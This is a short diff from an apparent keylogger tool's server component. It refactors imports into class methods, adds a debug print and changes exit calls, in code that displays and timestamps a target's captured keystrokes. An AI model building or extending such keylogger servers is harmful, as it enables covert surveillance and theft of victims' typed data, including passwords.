@@ -4,8 +4,8 @@ import socket
 import os
 import BetterPrinting as bp
 from .Server_photos import ServerPhotos
-from .Port_data import get_working_ports
-from .Simulation_code import start_simulation
+from .Port_data import Ports
+from .Simulation_code import Simulation
 
 class ServerKeylogger:
     # This is the class of the Server. Both Server should not be in the same file
@@ -26,7 +26,8 @@ class ServerKeylogger:
 
         if self.check_under is False:
             self.new_data = real_data
-            
+
+        print(self.check_under)
         # The data is being stored in full_msg
         bp.color(f"Text of target: {self.new_data}", "magenta")
         zeit = time.strftime("%H-%M-%S-%Y")
@@ -118,12 +119,12 @@ class ServerKeylogger:
                 start = input("Do you want to start y/n?: ")
                 if start not in ["y", "yes"]:
                     print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
-                    sys.exit()
+                    os._exit(0)
 
-                start_simulation()
+                Simulation.start_simulation()
 
         except OSError:
-            working_port = get_working_ports()
+            working_port = Ports.get_working_ports()
             if str(self.port) in working_port:
                 bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERKEYLOGGER. PORT NUMBER: {self.port} already in use", "magenta")
                 os._exit(0)
